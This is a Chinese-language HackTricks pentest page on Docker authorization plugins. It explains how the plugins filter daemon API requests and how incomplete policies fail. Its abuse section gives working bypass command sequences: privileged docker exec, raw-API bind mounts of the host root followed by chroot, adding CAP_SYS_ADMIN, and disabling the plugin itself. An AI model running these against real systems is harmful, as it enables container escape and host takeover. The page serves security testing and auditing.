# 运行时授权插件

{{#include ../../../banners/hacktricks-training.md}}

## 概述

运行时授权插件是额外的策略层，用于决定调用方是否可以执行某项守护进程操作。Docker 是典型示例。默认情况下，任何能够与 Docker 守护进程通信的人，实际上都能广泛控制它。授权插件会检查经过身份验证的用户和请求的 API 操作，然后根据策略允许或拒绝请求，以尝试收紧这一模型。

这个主题值得单独成页，因为当攻击者已经能够访问 Docker API 或属于 `docker` 组的用户时，它会改变利用模型。在这类环境中，问题不再只是“我能否访问守护进程？”，还包括“守护进程是否受到授权层限制？如果是，能否通过未处理的端点、薄弱的 JSON 解析或插件管理权限绕过该层？”

## 运作方式

请求到达 Docker 守护进程后，授权子系统可以将请求上下文传递给一个或多个已安装的插件。插件会看到经过身份验证的用户身份、请求详情、选定的请求头，以及在内容类型适用时请求或响应正文的部分内容。多个插件可以串联，只有所有插件都允许请求时，才会授予访问权限。

这个模型听起来很可靠，但其安全性完全取决于策略编写者对 API 的理解是否全面。如果插件会阻止 `docker run --privileged`，却忽略 `docker exec`、漏掉顶层 `Binds` 等其他 JSON 键，或允许管理插件，就可能造成限制已到位的假象，同时仍然留下直接的权限提升路径。

## 常见插件目标

策略审查时需要重点关注：

- 容器创建端点
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 和命名空间共享选项
- `docker exec` 的行为
- 插件管理端点
- 任何能够间接触发运行时操作、且超出预期策略模型的端点

历史上，Twistlock 的 `authz` 插件以及 `authobot` 这类简单的教学插件，都让这一模型易于研究，因为它们的策略文件和代码路径展示了端点到操作的映射实际上是如何实现的。进行评估时，重要的经验是：策略编写者必须了解完整的 API 范围，而不能只关注最显眼的 CLI 命令。

## 滥用

首先要弄清楚实际有哪些操作会被阻止。如果守护进程拒绝某项操作，错误信息通常会 leak 插件名称，这有助于识别正在使用的控制措施：

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

如果需要进行更全面的端点画像，`docker_auth_profiler` 等工具会很有用，因为它们可以自动完成原本重复繁琐的任务：检查插件实际允许访问哪些 API 路由和 JSON 结构。

如果环境使用自定义插件，且你可以与 API 交互，请枚举实际经过过滤的对象字段：

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

这些检查很重要，因为许多授权失败是字段特定的，而非概念特定的。插件可能会拒绝某种 CLI 模式，却未能完全阻止等效的 API 结构。

### 完整示例：创建容器后通过 `docker exec` 添加特权

如果策略阻止创建特权容器，但允许创建不受限制的容器并使用 `docker exec`，仍然可能绕过策略：

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

如果 daemon 接受第二步，用户就能在容器内获得一个特权交互式进程，而策略编写者原以为该容器受到限制。

即使调用者无法直接访问 Docker socket，受限的 `sudo` 规则也可能暴露相同途径。例如，允许以 root 身份运行 `/usr/bin/docker exec *`，可能使调用者能够传入 Docker 的 `--privileged` 和 `--user root` 选项。仍然需要有正在运行的容器；在某些 Linux 主机上，如果 `docker ps` 被禁止，容器 ID 可能会出现在 `containerd-shim` 进程的命令行中。应将这类规则视为需要审查的线索：确认实际生效的 sudo 策略、daemon 的授权控制、user namespaces，以及生成的进程是否能够访问主机设备或可写的主机挂载。Docker 在其 [CLI reference](https://docs.docker.com/reference/cli/docker/container/exec/) 中记录了 exec 选项。

以 root 身份运行、且接受调用者指定的 Compose 文件的 wrapper，需要验证整个 [Compose service model](https://docs.docker.com/reference/compose-file/services/)，不能只检查是否拒绝 `privileged: true`，以及是否要求 bind mount 使用 `:ro`。审查 `cap_add`、`security_opt`、设备、namespaces、build 输入，以及所有受支持的 volume 语法。根据 daemon 和 kernel 策略，即使 bind mount 是只读的，如果容器具有适当的 capabilities 且安全限制较宽松，从容器内部仍可能使其可写。仅基于前缀的主机路径允许列表，以及只检查最终路径组件的符号链接检查，也需要审查。sudo 规则和字面上的 `docker-compose up` 调用只是提示潜在问题；是否可利用取决于 wrapper 实际生效的验证措施以及运行时 daemon 的限制。

### 完整示例：通过原始 API 进行绑定挂载

有些有缺陷的策略只检查一种 JSON 结构。如果没有一致地阻止挂载根文件系统，仍然可以挂载主机：

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

同样的思路也可能出现在 `HostConfig` 下：

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

影响是完全逃逸到宿主机文件系统。值得注意的是，绕过源于策略覆盖不完整，而非内核漏洞。

### 完整示例：未检查的 Capability 属性

如果策略忘记过滤与 capability 相关的属性，攻击者可能创建一个重新获得危险 capability 的容器：

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

一旦具备 `CAP_SYS_ADMIN` 或类似的强大 capability，[capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中描述的许多 breakout 技术便可使用。

### 完整示例：禁用插件

如果允许执行插件管理操作，最直接的绕过方式可能是彻底关闭该控制：

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

这是控制平面层面的策略失效。授权层虽然存在，但原本应受其限制的用户仍然拥有禁用它的权限。

## 检查

这些命令旨在确定是否存在策略层，以及该策略层看起来是完整的还是仅流于表面。

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

这里有哪些值得关注的点：

- 包含插件名称的拒绝消息可确认存在授权层，并且通常会暴露具体实现。
- 攻击者可见的插件列表可能足以判断是否可以禁用或重新配置插件。
- 如果策略只拦截明显的 CLI 操作，却不拦截原始 API 请求，在证明其不可绕过之前，都应将其视为可绕过。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置了授权插件，否则对守护进程的访问实际上要么全开，要么全关 | 插件策略不完整、使用黑名单而非白名单、允许管理插件、字段级盲点 |
| Podman | 没有常见的直接等价机制 | Podman 通常更依赖 Unix 权限、rootless 执行和 API 暴露决策，而非 Docker 风格的授权插件 | 广泛暴露 rootful Podman API、套接字权限薄弱 |
| containerd / CRI-O | 控制模型不同 | 这些运行时通常依赖套接字权限、节点信任边界和更高层的编排器控制，而非 Docker 授权插件 | 将套接字挂载到工作负载中、节点本地信任假设薄弱 |
| Kubernetes | 在 API-server 和 kubelet 层使用认证/授权，而非 Docker 授权插件 | 集群 RBAC 和准入控制是主要策略层 | RBAC 范围过宽、准入策略薄弱、直接暴露 kubelet 或运行时 API |

{{#include ../../../banners/hacktricks-training.md}}
